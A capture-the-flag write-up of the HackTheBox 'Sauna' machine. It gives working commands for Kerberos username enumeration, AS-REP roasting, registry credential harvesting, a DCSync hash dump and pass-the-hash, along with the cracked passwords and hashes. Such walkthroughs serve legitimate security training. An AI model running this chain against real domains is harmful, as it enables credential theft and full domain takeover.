---
title: "HTB-Sauna-Easy"
date: "2025-11-26"
platform: "HackTheBox"
category: "Windows Active Directory"
difficulty: "Easy"
tags: [
  "Username Enumeration",
  "AS-REP Roasting",
  "Kerberos",
  "AutoLogon Credentials",
  "Registry Harvesting",
  "WinRM",
  "Password Cracking",
  "Hashcat",
  "Kerbrute",
  "BloodHound",
  "Privilege Escalation",
  "DCSync",
  "Pass-the-Hash",
  "Impacket",
  "SecretsDump",
  "Active Directory Attack Chain"
]
excerpt: "An AD-focused machine involving username harvesting from a website, AS-REP Roasting to crack a domain user's password, extracting AutoLogon credentials from the registry, and achieving Domain Admin through a powerful DCSync attack."
readingTime: 18
featured: true
---


## Initial Reconnaissance

### Port Scanning with Nmap

Let's fire up Nmap and see what services are exposed:

```bash
nmap --privileged -sV -sC -p- -T4 -o nmap_sauna.txt 10.10.10.175
```

**Key Services Identified:**

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

**Key Observations:**

- Domain: `EGOTISTICAL-BANK.LOCAL`
- Hostname: `SAUNA`
- Web server on port 80 (IIS 10.0)
- Standard AD services present
- WinRM enabled for remote access

---

## Web Enumeration

Since port 80 is open, let's check out the website:

### Website: Egotistical Bank

The website appears to be for a bank called "Egotistical Bank". After browsing through the site looking for vulnerabilities, nothing obvious stands out. However, we hit gold on the **About** page! 👀

![image](1.png)

**Team Members Found:**

```
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
```

These look like potential usernames! In Active Directory environments, usernames often follow predictable patterns. Let's generate possible username variations!

## Username Enumeration

### Generating Username Variations

We'll use **username-anarchy** to create different username format combinations:

**Create users.txt:**

```
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
```

**Generate username variations:**

```bash
./username-anarchy \
  --input-file user.txt \
  --select-format first,flast,first.last,firstl \
  > unames.txt
```

This generates usernames in formats like:

- `fergus` (first)
- `fsmith` (flast)
- `fergus.smith` (first.last)
- `ferguss` (firstl)

### Validating Usernames with Kerbrute

Now let's validate which usernames actually exist in the domain:

```bash
kerbrute userenum \
  -d EGOTISTICAL-BANK.LOCAL \
  --dc 10.10.10.175 \
  unames.txt
```

![image](2.png)

**Valid Username Found:** `fsmith` ✅

Excellent! We've confirmed that `fsmith` (Fergus Smith) is a valid domain user.

---

## AS-REP Roasting Attack

### What is AS-REP Roasting?

AS-REP Roasting is an attack that targets accounts with **Kerberos pre-authentication disabled**. When pre-auth is disabled, we can request authentication data for that user without knowing their password, and this data contains encrypted material we can crack offline! 🔓

### Requesting the AS-REP Hash

Let's check if `fsmith` has pre-authentication disabled:

```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/fsmith \
  -dc-ip 10.10.10.175 \
  -no-pass > fsmith_hash.txt
```

**Success!** We got the AS-REP hash:

```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:9b0af23d839a0f034590b66440bbab8e$095088d95e88e8b285a411198b6620b031ac09580194f59fc87d03737efe41cc8cc356cc84c7bbe9886e51b48d782e0742214be9991c1de1a2ae4d5066e1dae69dabfe121c6bbecd9e2785878d95e6738f9b32c2d11897b5944d9ad9efdf5f7a6ec9486a5b6c682e7b200e3cdb8437befbcd8feffa0c3d057fcd08112633ae28ebdd3d60086e8e8040e02d7b7954fac7b91dc9004b86601a59191761cbded9b837aeacbd91c339c4c331cddcf570d0577041524b5a09aec29f0c32649efdc8257f3f4790d717752c1424740c647296e9e05157eb27c75b6c08bfea750aa3b2b21b6b5200980c62edbda51c34ec82fe05f8af7698848fc46e49bcf4bcc606ef9d
```

### Cracking the Hash

Time to crack this hash using Hashcat:

```bash
hashcat -m 18200 fsmith_hash.txt /usr/share/wordlists/rockyou.txt
```

**Password Cracked:** `Thestrokes23` 🎸

Full output:

```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:...:Thestrokes23
```

We now have valid domain credentials!

```
Username: fsmith@EGOTISTICAL-BANK.LOCAL
Password: Thestrokes23
```

---

## User Flag - Initial Access

Let's connect via WinRM with our newly cracked credentials:

```bash
evil-winrm -i 10.10.10.175 \
  -u fsmith@EGOTISTICAL-BANK.LOCAL \
  -p Thestrokes23
```

**User Flag:** `6eb68cd27c1649e77f175915e9617424` ✅

---

## Privilege Escalation - Finding AutoLogon Credentials

### What are AutoLogon Credentials?

Windows can be configured to automatically log in a user without requiring a password prompt. When this is enabled, the credentials are stored in the registry! This is a common misconfiguration we can exploit. 🔍

### Checking the Registry

Let's query the Windows Registry for AutoLogon credentials:

```powershell
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | 
  Select-Object DefaultUserName, DefaultPassword, AutoAdminLogon
```

![image](3.png)

**Jackpot!** We found AutoLogon credentials stored in plaintext:

```
Username: EGOTISTICALBANK\svc_loanmanager
Password: Moneymakestheworldgoround!
```

### Verifying the User

Let's check if this user exists in the domain:

![image](4.png)

**Confirmed!** The user `svc_loanmgr` exists in the domain.

**Full Credentials:**

```
Username: svc_loanmgr
Password: Moneymakestheworldgoround!
```

---

## Privilege Escalation - DCSync Attack

### Checking User Privileges

Now that we have credentials for `svc_loanmgr`, let's check what permissions this account has. Service accounts often have elevated privileges!

After enumeration (via BloodHound or manual checks), we discover that **`svc_loanmgr` has DCSync rights!** 🎯

### What is DCSync?

DCSync is a powerful attack that allows us to:

- Impersonate a Domain Controller
- Request password hashes for any domain account
- Effectively dump the entire Active Directory database

This is **game over** for the domain! 💥

### Executing the DCSync Attack

Let's dump all domain credentials:

```bash
impacket-secretsdump -just-dc \
  'EGOTISTICAL-BANK/svc_loanmgr:Moneymakestheworldgoround!'@10.10.10.175
```

**Output - The Crown Jewels:**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:bffee4f18d0f3a52eb21c7c4619777bc:::

[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
[... more keys ...]
```

**We now have:**

- Administrator NTLM hash: `823452073d75b9d1cf70ebdf86c7f98e`
- All user password hashes
- Kerberos encryption keys

---

## Root Flag - Pass-the-Hash

We don't need to crack the Administrator password—we can use **Pass-the-Hash** to authenticate directly:

```bash
evil-winrm -i 10.10.10.175 \
  -u Administrator \
  -H 823452073d75b9d1cf70ebdf86c7f98e
```

Or using PSExec:

```bash
impacket-psexec EGOTISTICAL-BANK/Administrator@10.10.10.175 \
  -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

**Root Flag:** `cd2d321866f37c79cd580be889910abd` 🏆
